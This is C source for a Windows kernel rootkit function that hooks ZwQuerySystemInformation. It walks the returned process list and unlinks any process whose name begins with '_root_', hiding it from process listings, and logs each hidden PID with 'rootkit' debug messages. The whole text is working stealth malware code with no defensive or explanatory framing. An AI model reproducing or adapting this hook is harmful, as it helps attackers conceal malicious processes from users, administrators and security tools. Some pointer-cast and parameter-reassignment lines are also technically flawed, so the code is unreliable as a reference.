NTSTATUS NewZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
			IN PVOID SystemInformation,
			IN ULONG SystemInformationLength,
			OUT PULONG ReturnLength
)
{
	NTSTATUS rc;
	CHAR aProcessName[PROCNAMELEN];
		
	GetProcessName( aProcessName );
	DbgPrint("rootkit: NewZwQuerySystemInformation() from %s\n", aProcessName);

	rc = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
			SystemInformationClass,
			SystemInformation,
			SystemInformationLength,
			ReturnLength );

	if( NT_SUCCESS( rc ) ) 
	{
		// double check the process name, if it starts w/ '_root_' DO NOT
		// apply any stealth
		if(0 == memcmp(aProcessName, "_root_", 6))
		{
			DbgPrint("rootkit: detected system query from _root_ process\n");
		}
		else if( 5 == SystemInformationClass )
		{
			// this is a process list, look for process names that start with
			// '_root_'
			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;
			while(curr)
			{	
				//struct _SYSTEM_PROCESSES *next = ((char *)curr += curr->NextEntryDelta);
				
				ANSI_STRING process_name;
				RtlUnicodeStringToAnsiString( &process_name, &(curr->ProcessName), TRUE);
				if( (0 < process_name.Length) && (255 > process_name.Length) )
				{
					if(0 == memcmp( process_name.Buffer, "_root_", 6))
					{
						//////////////////////////////////////////////
						// we have a winner!
						//////////////////////////////////////////////
						char _output[255];
						char _pname[255];
						memset(_pname, 0, 255);
						memcpy(_pname, process_name.Buffer, process_name.Length);

						sprintf(	_output, 
									"rootkit: hiding process, pid: %d\tname: %s\r\n", 
									curr->ProcessId, 
									_pname);
						DbgPrint(_output);

						if(prev)
						{
							if(curr->NextEntryDelta)
							{
								// make prev skip this entry
								prev->NextEntryDelta += curr->NextEntryDelta;
							}
							else
							{
								// we are last, so make prev the end
								prev->NextEntryDelta = 0;
							}
						}
						else
						{
							if(curr->NextEntryDelta)
							{
								// we are first in the list, so move it forward
								(char *)SystemInformation += curr->NextEntryDelta;
							}
							else
							{
								// we are the only process!
								SystemInformation = NULL;
							}
						}
					}
				}
				RtlFreeAnsiString(&process_name);
				prev = curr;
				if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
				else curr = NULL;
			}
		}
	}
	return(rc);
}